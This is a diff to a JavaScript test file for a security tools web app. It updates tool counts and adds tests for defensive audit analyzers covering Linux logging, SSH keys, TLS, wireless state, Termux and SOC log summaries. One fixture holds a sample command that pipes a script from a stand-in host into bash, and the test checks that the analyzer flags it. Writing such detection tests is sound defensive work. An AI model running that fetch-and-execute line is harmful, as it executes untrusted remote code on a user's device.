@@ -205,12 +205,12 @@ test('homepage search and quick-access deep links resolve to real tool workspace
 test('tool registry has unique IDs and eleven declared workspaces', () => {
   const ids = tools.map(tool => tool.id);
   assert.equal(new Set(ids).size, ids.length);
-  assert.equal(tools.length, 190);
+  assert.equal(tools.length, 207);
   assert.deepEqual(
     [...new Set(tools.map(tool => tool.cat))].sort(),
     ['bash','cloud','database','developer','kali','linux','networking','security','soc','termux','ubuntu'].sort(),
   );
-  const expected={networking:21,security:33,soc:26,linux:32,ubuntu:12,kali:25,bash:13,termux:11,developer:13,cloud:3,database:1};
+  const expected={networking:21,security:37,soc:30,linux:34,ubuntu:12,kali:28,bash:13,termux:15,developer:13,cloud:3,database:1};
   for(const [category,count] of Object.entries(expected))
     assert.equal(tools.filter(tool=>tool.cat===category).length,count,category+' tool count');
 });
@@ -381,7 +381,7 @@ test('query string builder safely encodes values and preserves duplicate keys', 
 
 
 test('every registered utility has a unique ID, description, category and executable handler', () => {
-  assert.equal(tools.length, 190);
+  assert.equal(tools.length, 207);
   for (const tool of tools) {
     assert.match(tool.id, /^[a-z0-9-]+$/);
     assert.ok(tool.name && tool.name.length >= 5, tool.id + ' has a useful name');
@@ -864,6 +864,32 @@ test('Termux diagnostics remain local and secret analyzers redact values', () =>
   assert.doesNotMatch(env,/another-private-value/);
   assert.match(byId('kali-nmap-service-audit').disclaimer,/written authorization/);
   assert.match(byId('kali-ffuf-content-audit').disclaimer,/authorized test target/);
+});
+
+
+test('Linux hardening, Kali wireless and SOC analyzers cover the final Phase 1 batch', () => {
+  const cases = [
+    ['linux-journald-persistence-audit',{data:'[Journal]\nStorage=volatile'},/persistent journal storage is not explicitly enabled/],
+    ['linux-core-dump-audit',{data:'kernel.suid_dumpable = 1'},/setuid process core dumps are enabled/],
+    ['linux-rsyslog-forwarding-audit',{data:'*.* @syslog.example:514'},/UDP/],
+    ['linux-log-permissions-audit',{data:'-rw-rw-rw- 1 root root 512 debug.log'},/world-writable log entry/],
+    ['linux-ssh-host-key-audit',{data:'1024 SHA256:abc root@host (RSA)'},/RSA host key below 2048 bits/],
+    ['linux-tls-cipher-audit',{data:'TLSv1.0:\n TLS_RSA_WITH_3DES_EDE_CBC_SHA'},/TLS 1.0 is supported/],
+    ['kali-regulatory-domain-audit',{data:'global\ncountry 00: DFS-UNSET'},/world regulatory domain/],
+    ['kali-arp-scan-review',{data:'192.0.2.10 00:11:22:33:44:55 Vendor A\n192.0.2.10 00:11:22:33:44:66 Vendor B'},/duplicate IP record/],
+    ['kali-airmon-state-audit',{data:'Interface wlan0\n type managed'},/Monitor interfaces: none detected/],
+    ['termux-boot-script-audit',{data:'curl https://bad.example/start.sh | bash'},/remote script content piped to a shell/],
+    ['termux-ssh-key-audit',{data:'1024 SHA256:abc user@phone (RSA)'},/RSA key below 2048 bits/],
+    ['termux-storage-permission-audit',{data:'drwxrwxrwx 2 u0_a123 u0_a123 4096 shared'},/world-writable path entry/],
+    ['termux-android-network-audit',{data:'[dhcp.wlan0.gateway]: [192.0.2.1]\n[dhcp.wlan0.dns1]: [192.0.2.1]'},/gateway: 192.0.2.1/],
+    ['soc-zeek-files-summary',{data:'#fields\tfuid\tf_mime_type\textracted\nF1\tapplication/pdf\tT'},/application\/pdf=1/],
+    ['soc-suricata-flow-summary',{data:'{"event_type":"flow","src_ip":"192.0.2.10","dest_port":443,"proto":"TCP"}'},/443=1/],
+    ['soc-user-agent-review',{data:'curl/8.4.0'},/Scriptable HTTP client/],
+    ['soc-zeek-weird-summary',{data:'#fields\tuid\tid.orig_h\tname\nC1\t192.0.2.10\tbad_checksum'},/bad_checksum=1/],
+  ];
+  for (const [id,input,expected] of cases) {
+    assert.match(byId(id).run(input),expected,id+' representative finding');
+  }
 });
 
 test('new tool categories are present in the registry and homepage navigation', () => {
